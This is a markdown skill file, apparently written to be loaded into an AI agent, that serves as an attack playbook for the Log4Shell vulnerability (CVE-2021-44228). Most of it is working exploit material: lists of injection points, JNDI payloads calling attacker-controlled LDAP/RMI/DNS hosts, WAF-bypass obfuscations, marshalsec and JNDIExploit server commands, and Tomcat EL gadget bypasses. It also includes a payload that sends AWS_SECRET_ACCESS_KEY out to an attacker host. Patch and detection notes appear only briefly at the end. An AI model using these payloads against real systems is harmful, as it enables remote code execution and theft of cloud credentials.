---
name: log4j-exploitation
description: >-
  Log4j2 / Log4Shell (CVE-2021-44228) exploitation playbook. Covers JNDI lookup abuse via log messages, WAF bypass payloads, post-JDK 8u191 exploitation chains, detection and remediation.
---

# SKILL: Log4j2 / Log4Shell Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Log4Shell-specific exploitation covering payload construction, WAF bypass, JDK version constraints, and post-exploitation. Base models often miss the breadth of injection points and the JDK version bypass chains.

## 0. RELATED ROUTING

- [jndi-injection](../jndi/SKILL.md) for JNDI protocol internals and LDAP/RMI server setup
- [deserialization-insecure](../deserialization/SKILL.md) for gadget chains used in post-JDK 8u191 bypass
- [fastjson-exploitation](../fastjson-exploitation/SKILL.md) when Fastjson is also in the target classpath

---

## 1. VULNERABILITY OVERVIEW

| | Detail |
|---|--------|
| CVE | CVE-2021-44228 |
| Affected | Log4j 2.0-beta9 through 2.14.1 |
| Not Affected | Log4j 1.x (different lookup mechanism) |
| Fix | Log4j 2.17.0+ (removes JNDI lookup by default) |
| Root Cause | `org.apache.logging.log4j.core.lookup.JndiLookup` evaluates `${jndi:...}` in log messages |

---

## 2. INJECTION POINTS — WHERE TO SEND PAYLOADS

Any user-controlled data that ends up in a log message:

```
HTTP headers:     User-Agent, X-Forwarded-For, Referer, Accept, Cookie, Authorization
URL parameters:   ?q=${jndi:...}, ?id=${jndi:...}
POST body:        username, email, message, comment, search query
File uploads:     filename in multipart upload
WebSocket:        message content
SMTP:             Subject, From, To headers (if logged)
Database:         values that get logged by the application
LDAP:             attributes that applications log
```

---

## 3. BASIC PAYLOADS

### 3.1 DNS Exfiltration (Detection)

```
${jndi:ldap://attacker.dns.log/exp}
${jndi:dns://attacker.dns.log/exp}
${jndi:rmi://attacker.dns.log/exp}
```

Use DNSLog / interactsh / Burp Collaborator to catch callbacks.

### 3.2 Remote Class Loading (Pre-JDK 8u191)

```
${jndi:ldap://attacker:1389/Exploit}
${jndi:rmi://attacker:1099/Exploit}
```

Server serves malicious class via `marshalsec` or `JNDIExploit`.

### 3.3 RCE Payload Construction

```bash
# marshalsec LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit" 1389

# JNDIExploit (one-click, includes bypasses)
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attacker_ip -l 1388 -p 8888
```

---

## 4. WAF BYPASS PAYLOADS

### 4.1 Lookup Nesting / Lower-Upper

```
${jndi:${lower:l}${lower:d}ap://attacker/exp}
${${lower:j}ndi:${lower:l}${lower:d}ap://attacker/exp}
${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker/exp}
```

### 4.2 Environment Variable Nested Lookup

```
${jndi:ldap://${env:HOSTNAME}.attacker.dns.log/exp}
${jndi:ldap://${sys:java.version}.attacker.dns.log/exp}
${jndi:ldap://${hostName}.attacker.dns.log/exp}
```

### 4.3 Whitespace / Null Byte Padding

```
${jndi:ldap://attacker/exp}
${jndi:ldap://attacker/exp}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/exp}
```

### 4.4 Unicode / URL Encoding

```
%24%7Bjndi%3Aldap%3A%2F%2Fattacker%2Fexp%7D
${jndi:ldap://attacker/exp}
```

### 4.5 Date/Pattern Layout Abuse

```
${${what:ever:-j}${what:ever:-n}${what:ever:-d}${what:ever:-i}:ldap://attacker/exp}
```

---

## 5. POST-JDK 8u191 EXPLOITATION

When `com.sun.jndi.ldap.object.trustURLCodebase=false` (JDK 8u191+):

### 5.1 Local Gadget Chain via LDAP

```
1. LDAP server returns Reference with factory
2. Factory loads from local classpath (no remote classloading)
3. Use local gadget: Tomcat EL, Groovy, Commons Collections, etc.
```

### 5.2 Tomcat EL Expression Bypass

```bash
# JNDIExploit with Tomcat bypass
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attacker -l 1388 -p 8888

# LDAP returnsSerializedData with Tomcat EL gadget
${jndi:ldap://attacker:1389/TomcatBypass/Command/id}
```

### 5.3 Deserialize Gadget via LDAP

```
LDAP server returns javaSerializedData attribute → local gadget deserialization
Use ysoserial gadget chains available in target classpath
```

---

## 6. BLIND / OUT-OF-BAND DETECTION

When no direct RCE but need to confirm vulnerability:

```
# DNS callback
${jndi:ldap://${env:USER}.attacker.dns.log/a}

# HTTP callback with exfiltrated data
${jndi:ldap://attacker/${env:AWS_SECRET_ACCESS_KEY}}

# Time-based detection (slow LDAP response)
${jndi:ldap://attacker:1389/delay10s}
```

---

## 7. EXPLOIT TOOLS

| Tool | Use Case |
|------|----------|
| `marshalsec` | JNDI LDAP/RMI reference server |
| `JNDIExploit` | One-click JNDI with JDK bypass |
| `log4j-scan` | Automated Log4Shell scanner |
| `log4j2burpscanner` | Burp Suite plugin for Log4Shell |
| `interactsh` | OOB interaction server (DNS/HTTP) |
| `ysoserial` | Gadget chain generation |

---

## 8. PATCH / DETECTION NOTES

### 8.1 Patch Levels

| Version | Status |
|---------|--------|
| 2.14.1 and below | Vulnerable |
| 2.15.0 | Partial fix (still vulnerable in certain configs) |
| 2.16.0 | Fixes lookups in message pattern |
| 2.17.0+ | Complete fix (JNDI disabled by default) |

### 8.2 Detection Queries

```bash
# Search for vulnerable Log4j versions in classpath
find / -name "log4j-core-*.jar" 2>/dev/null

# Check Java version for JDK bypass applicability
java -version  # < 8u191 = direct exploitation

# YARA rule for Log4Shell in JAR files
rule LOG4SHELL {
    strings:
        $s1 = "org/apache/logging/log4j/core/lookup/JndiLookup"
    condition:
        $s1
}
```
